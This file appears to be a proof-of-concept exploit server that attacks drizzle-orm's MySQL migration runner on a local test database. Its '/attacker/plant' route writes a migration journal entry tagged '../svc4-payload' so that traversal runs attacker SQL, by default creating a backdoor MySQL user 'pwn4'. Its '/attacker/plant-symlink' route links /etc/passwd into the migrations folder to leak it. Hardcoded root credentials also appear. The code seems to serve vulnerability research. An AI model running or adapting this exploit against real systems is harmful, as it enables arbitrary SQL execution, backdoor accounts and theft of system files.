import express from 'express';
import fs from 'node:fs';
import mysql from 'mysql2/promise';
import { drizzle } from 'drizzle-orm/mysql2';
import { migrate } from 'drizzle-orm/mysql2/migrator';

const PORT = 3004;
const MIGRATIONS_FOLDER = '/tmp/svc4-migrations';
const PAYLOAD_PATH = '/tmp/svc4-payload.sql';

const conn = await mysql.createConnection({
    host: '127.0.0.1',
    port: 3307,
    user: 'root',
    password: 'rootpass',
    database: 'pocdb',
    multipleStatements: true,
});
const db = drizzle(conn);

await conn.query('DROP TABLE IF EXISTS audit_svc4');
await conn.query('DROP TABLE IF EXISTS __drizzle_migrations');
await conn.query(`
    CREATE TABLE audit_svc4 (
        id INT PRIMARY KEY AUTO_INCREMENT,
        ran_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        event VARCHAR(200)
    )
`);

fs.rmSync(MIGRATIONS_FOLDER, { recursive: true, force: true });
fs.mkdirSync(`${MIGRATIONS_FOLDER}/meta`, { recursive: true });
fs.writeFileSync(
    `${MIGRATIONS_FOLDER}/0000_init.sql`,
    `INSERT INTO audit_svc4 (event) VALUES ('benign-0000-init');`
);
fs.writeFileSync(`${MIGRATIONS_FOLDER}/meta/_journal.json`, JSON.stringify({
    version: '5',
    dialect: 'mysql',
    entries: [
        { idx: 0, version: '5', when: 1, tag: '0000_init', breakpoints: true },
    ],
}, null, 2));
try { fs.unlinkSync(PAYLOAD_PATH); } catch {}
try { await conn.query("DROP USER 'pwn4'@'%'"); } catch {}

const app = express();
app.use(express.json());

app.post('/admin/run-migrations', async (req, res) => {
    try {
        await migrate(db, { migrationsFolder: MIGRATIONS_FOLDER });
        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ error: String(e) });
    }
});

app.get('/admin/audit', async (req, res) => {
    const [rows] = await conn.query('SELECT id, event, ran_at FROM audit_svc4 ORDER BY id');
    res.json(rows);
});

app.get('/admin/users', async (req, res) => {
    const [rows] = await conn.query(
        "SELECT User, Host FROM mysql.user WHERE User NOT IN ('mysql.sys','mysql.session','mysql.infoschema')"
    );
    res.json(rows);
});

app.get('/admin/journal', (req, res) => {
    try {
        res.type('json').send(fs.readFileSync(`${MIGRATIONS_FOLDER}/meta/_journal.json`, 'utf-8'));
    } catch (e) {
        res.status(500).json({ error: String(e) });
    }
});

app.post('/attacker/plant', (req, res) => {
    const payloadSQL = req.body?.payloadSQL ?? `
        INSERT INTO audit_svc4 (event) VALUES ('ATTACKER WAS HERE');
        CREATE USER 'pwn4'@'%' IDENTIFIED BY 'pwn4';
    `;
    fs.writeFileSync(PAYLOAD_PATH, payloadSQL);
    fs.writeFileSync(`${MIGRATIONS_FOLDER}/meta/_journal.json`, JSON.stringify({
        version: '5',
        dialect: 'mysql',
        entries: [
            { idx: 0, version: '5', when: 1, tag: '0000_init', breakpoints: true },
            { idx: 1, version: '5', when: 2, tag: '../svc4-payload', breakpoints: true },
        ],
    }, null, 2));
    res.json({ ok: true, planted: { journal: `${MIGRATIONS_FOLDER}/meta/_journal.json`, payload: PAYLOAD_PATH } });
});

app.post('/attacker/plant-symlink', (req, res) => {
    const target = req.body?.target ?? '/etc/passwd';
    const linkPath = `${MIGRATIONS_FOLDER}/leak.sql`;
    try { fs.unlinkSync(linkPath); } catch {}
    fs.symlinkSync(target, linkPath);
    fs.writeFileSync(`${MIGRATIONS_FOLDER}/meta/_journal.json`, JSON.stringify({
        version: '5',
        dialect: 'mysql',
        entries: [
            { idx: 0, version: '5', when: 1, tag: '0000_init', breakpoints: true },
            { idx: 2, version: '5', when: 3, tag: 'leak', breakpoints: true },
        ],
    }, null, 2));
    res.json({ ok: true, linked: { from: linkPath, to: target } });
});

app.listen(PORT, () => {
    console.log(`svc4-migrator-traversal listening on http://127.0.0.1:${PORT}`);
});
